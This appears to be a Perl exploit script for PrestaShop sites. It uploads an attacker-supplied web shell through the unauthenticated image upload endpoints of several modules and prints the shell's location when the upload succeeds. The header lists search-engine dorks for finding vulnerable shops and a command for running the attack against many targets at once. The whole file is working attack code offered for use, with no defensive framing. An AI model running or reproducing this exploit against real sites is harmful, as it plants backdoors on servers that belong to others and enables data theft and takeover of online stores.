#!/usr/bin/perl
############################################
############################################
## PTRSTASHOP MODULES SHELL UPLOAD
## PRESTA-modules-shell-exploit.pl
## CODED BY ALI MEHDIOUI
## ALISAM TECHNOLOGY TEAM
############################################
## DORKS
## inurl:/modules/vtemslideshow/
## inurl:/modules/productpageadverts/
## inurl:/modules/homepageadvertise/
## inurl:/modules/columnadverts/
## inurl:/modules/vtemslideshow/

##   USAGE:
##     perl PRESTA-modules-shell-exploit.pl TARGET YOUR_SHELL
##   
##   ATSCAN MASS USAGE:
##   atscan -d 'dorks_file' -m 2 -l 10 --command "perl PRESTA-modules-shell-exploit.pl --TARGET SHELL" 
############################################
############################################
use strict;
use warnings;
use FindBin '$Bin';
use Term::ANSIColor;
use URI::Escape;
use HTML::Entities;
use LWP::UserAgent;
print color 'reset';
my $ua = LWP::UserAgent->new;
$ua->timeout(10);
print "
      [+]================================================================[+]
      [+]----------   Prestashop Modules Shell Upload Exploit   ---------[+]
      [+]--------------          Alisam Technology         --------------[+]
      [+]------ https://www.fb.com/Forces.des.tempetes.marocaines  ------[+]
      [+]------        https://www.youtube.com/user/aliartes       ------[+]
      [+]================================================================[+]	  
\n";
if (@ARGV<2) { print "Usage: perl PRESTA-modules-shell-exploit.pl Target Shell\n"; exit; }
my $URL=$ARGV[0];
my $FILE=$ARGV[1];
my @error=("Shell uploaded successefuly", "Target Not vulnerable");
my @PARAMETER=("/simpleslideshow/", "/productpageadverts/", "/homepageadvertise/", "/columnadverts/", "/vtemslideshow/");
for my $PARAMETER(@PARAMETER) {
  if ($URL=~/$PARAMETER/) {
    $URL=~s/$PARAMETER(.*)//s;
    my $add=$PARAMETER."uploadimage.php";
    $URL=$URL.$add;    
    print "      SCAN   : "; 
    use HTTP::Request::Common;
    $ua = LWP::UserAgent->new;
    my $response=$ua->request(POST $URL, ['Content_Type' => 'form-data', 'userfile' => $FILE]);
    my $shellFILE=$FILE;
    if ($response->content=~/success/) {
      print color 'green'; print "$error[0] ";
      $shellFILE=~s/$Bin//g;
      my $shell="slides".$shellFILE;
      $URL=~s/uploadimage.php/$shell/g;
      print color 'green'; print "$URL\n";
      print color 'reset';
    }else{
      print color 'red'; print "$error[1]\n";
      print color 'reset';
    }
  }
}
